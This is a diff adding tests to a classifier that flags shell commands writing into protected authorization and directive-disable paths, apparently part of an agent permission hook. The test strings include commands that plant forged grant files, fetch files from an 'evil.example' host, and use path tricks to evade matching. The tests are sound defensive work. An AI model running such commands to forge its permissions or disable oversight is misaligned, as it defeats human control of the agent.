@@ -859,6 +859,211 @@ describe("classifyShellAuthzOps (#2944)", () => {
     expect(classifyShellAuthzOps("git status")).toEqual([]);
   });
 
+  it("classifies residual dest-form plants after #3382 as settings (#3421)", () => {
+    for (const cmd of [
+      "git clone https://evil.example/repo .deft/authz/grants/evil",
+      "git worktree add .deft/authz/grants/evil HEAD",
+      "git submodule add https://evil.example/repo .deft/authz/grants/evil",
+      "ex .deft/authz/grants/evil.json",
+      "dos2unix -n src.json .deft/authz/grants/evil.json",
+      "aws s3 sync s3://evil .deft/authz/grants",
+      "aws s3api get-object --bucket b --key k --outfile .deft/authz/grants/evil.json",
+      "pijul clone https://evil.example/repo .deft/authz/grants/evil",
+      "pg_dump -f .deft/authz/grants/evil.sql db",
+      "pg_dump --file .deft/authz/grants/evil.sql db",
+      "pg_dump --file=.deft/authz/grants/evil.sql db",
+      "convert src.json .deft/authz/grants/evil.json",
+      "magick src.json .deft/authz/grants/evil.json",
+      "fossil --workdir=.deft/authz/grants open repo.fossil",
+      "New-Item -Path .deft/authz/grants/evil.json -ItemType File",
+      "New-Item -Path=.deft/authz/grants/evil.json",
+      "fallocate -l 1k .deft/authz/grants/evil.json",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    for (const cmd of [
+      "git clone https://evil.example/repo .deft-directive-disable",
+      "ex .no-deft-directive",
+      "dos2unix -n src .deft-directive-disable",
+      "aws s3 sync s3://evil .no-deft-directive",
+      "pijul clone https://evil.example/repo .deft-directive-disable",
+      "pg_dump -f .deft-directive-disable db",
+      "convert src .no-deft-directive",
+      "magick src .deft-directive-disable",
+      "fossil --workdir=.no-deft-directive open repo.fossil",
+      "New-Item -Path .deft-directive-disable -ItemType File",
+      "fallocate -l 1k .deft-directive-disable",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Already-denied #3400 / #3382 peers stay settings.
+    expect(classifyShellAuthzOps("cmake -E copy src .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    expect(
+      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
+    ).toContain("settings");
+    expect(classifyShellAuthzOps("ed .deft/authz/grants/evil.json")).toContain("settings");
+    expect(classifyShellAuthzOps("nvim .deft/authz/grants/evil.json")).toContain("settings");
+    expect(classifyShellAuthzOps("fossil --workdir .deft/authz/grants open repo.fossil")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("aws s3 cp s3://evil/x .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    // Fail-closed: unknown write-shaped dest flags targeting protected paths (#3421).
+    expect(classifyShellAuthzOps("unknownwriter --workdir=.deft/authz/grants")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("unknownwriter --file .deft-directive-disable")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("unknownwriter --separate-git-dir=.deft/authz/grants")).toContain(
+      "settings",
+    );
+    // Read-shaped peers stay unclassifiable (do not treat input flags / git log as dests).
+    expect(classifyShellAuthzOps("grep -f .deft/authz/patterns.txt src.txt")).toEqual([]);
+    expect(classifyShellAuthzOps("grep --file .deft/authz/patterns.txt src.txt")).toEqual([]);
+    expect(classifyShellAuthzOps("grep --file=.deft/authz/patterns.txt src.txt")).toEqual([]);
+    expect(classifyShellAuthzOps("Get-Content -Path .deft/authz/state.json")).toEqual([]);
+    expect(classifyShellAuthzOps("git log -- .deft/authz/state.json")).toEqual([]);
+    expect(classifyShellAuthzOps("git log worktree -- .deft/authz/state.json")).toEqual([]);
+    expect(classifyShellAuthzOps("git --no-pager log worktree -- .deft/authz/state.json")).toEqual(
+      [],
+    );
+    expect(
+      classifyShellAuthzOps("aws s3 cp src /tmp/out; touch .deft-directive-disable"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps("git --attr-source HEAD clone https://example .deft/authz/grants/evil"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps("git --attr-source log clone https://example .deft/authz/grants/evil"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps(
+        "git --unlisted-global log clone https://example .deft/authz/grants/evil",
+      ),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps("git --shallow-file x clone https://example .deft/authz/grants/evil"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps("git --attr-source HEAD worktree add .deft/authz/grants/evil HEAD"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps(
+        "git --shallow-file x submodule add https://example .deft/authz/grants/evil",
+      ),
+    ).toContain("settings");
+    expect(classifyShellAuthzOps("git --attr-source HEAD log -- .deft/authz/state.json")).toEqual(
+      [],
+    );
+    expect(classifyShellAuthzOps("git show submodule -- .deft/authz/state.json")).toEqual([]);
+    expect(classifyShellAuthzOps("echo x > .deft/approved-scope-backup/story.json")).toEqual([]);
+    expect(classifyShellAuthzOps("echo x > .deft/authz-backup/story.json")).toEqual([]);
+    expect(classifyShellAuthzOps("echo x > .deft/foo/../authz-backup/story.json")).toEqual([]);
+    expect(classifyShellAuthzOps("echo x > .deft/foo/../approved-scope/story.json")).toContain(
+      "settings",
+    );
+    expect(
+      classifyShellAuthzOps("cp forged.json .deft/foo/../approved-scope/story.json"),
+    ).toContain("settings");
+    expect(classifyShellAuthzOps("echo x > .deft/foo/../authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("echo x > .deft/foo/../.deft-directive-disable")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("echo x > .deft//approved-scope/story.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("echo x > .deft/./approved-scope/story.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("cp forged.json .deft//approved-scope/story.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("echo x > .deft//authz/grants/evil.json")).toContain("settings");
+    expect(classifyShellAuthzOps("echo x > .deft/./authz/grants/evil.json")).toContain("settings");
+    expect(classifyShellAuthzOps("unix2dos -n src .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("pg_restore --file=.deft/authz/grants/evil.sql dump")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("mogrify -write .deft/authz/grants/evil.json src.png")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("mogrify .deft/authz/grants/evil.json")).toContain("settings");
+    expect(classifyShellAuthzOps("mogrify .deft/authz/x extra.png")).toContain("settings");
+    // Last-positional dest bins: protected source that writes elsewhere is not dest plant.
+    expect(classifyShellAuthzOps("aws s3 cp .deft/authz/x /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("convert .deft/authz/x /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("magick .deft/authz/x /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("aws s3 cp .deft/approved-scope/x /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("convert .deft-directive-disable /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("env aws s3 cp .deft-directive-disable /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("env aws s3 cp .deft/authz/x /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("FOO=1 aws s3 cp .deft/authz/x /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("sudo aws s3 cp src .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("env aws s3 cp src .deft-directive-disable")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("env -C /tmp aws s3 cp .deft/authz/x /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("timeout 5 aws s3 cp .deft/authz/x /tmp/out")).toEqual([]);
+    expect(
+      classifyShellAuthzOps("env -C /tmp aws s3 cp src .deft/authz/grants/evil.json"),
+    ).toContain("settings");
+    expect(
+      classifyShellAuthzOps(
+        "git --list-objects-filter tree:0 clone https://example .deft/authz/grants/evil",
+      ),
+    ).toContain("settings");
+    expect(classifyShellAuthzOps("echo x > foo.deft/authz/story.json")).toEqual([]);
+    expect(classifyShellAuthzOps("echo x > x.deft/approved-scope/story.json")).toEqual([]);
+    expect(classifyShellAuthzOps("aws s3 cp src .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("convert src .deft/approved-scope/story.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("magick src .no-deft-directive")).toContain("settings");
+    // Approved-scope mint symmetry with Write (#3421 MEDIUM).
+    expect(classifyShellAuthzOps("cp forged.json .deft/approved-scope/story.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("echo x > .deft/approved-scope/story.json")).toContain("settings");
+    expect(
+      classifyShellAuthzOps("git clone https://evil.example/r .deft/approved-scope/evil"),
+    ).toContain("settings");
+    expect(
+      classifyHookAuthzOps({
+        toolName: "Write",
+        shellCommand: null,
+        isDirectWrite: true,
+      }),
+    ).toEqual(["edit"]);
+    // Ordinary dests stay unclassifiable (no overclassify).
+    expect(classifyShellAuthzOps("git clone https://example.com/repo /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("git worktree add /tmp/out HEAD")).toEqual([]);
+    expect(classifyShellAuthzOps("ex /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("dos2unix -n src /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("aws s3 sync s3://example /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("pijul clone https://example.com/repo /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("pg_dump -f /tmp/out db")).toEqual([]);
+    expect(classifyShellAuthzOps("convert src /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("fossil --workdir=/tmp/out open repo.fossil")).toEqual([]);
+    expect(classifyShellAuthzOps("New-Item -Path /tmp/out -ItemType File")).toEqual([]);
+    expect(classifyShellAuthzOps("fallocate -l 1k /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("cat .deft/approved-scope/story.json")).toEqual([]);
+    expect(classifyShellAuthzOps("git status")).toEqual([]);
+  });
+
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
     // Base64/byte path construction — residual after #3110 literal path match.
     expect(
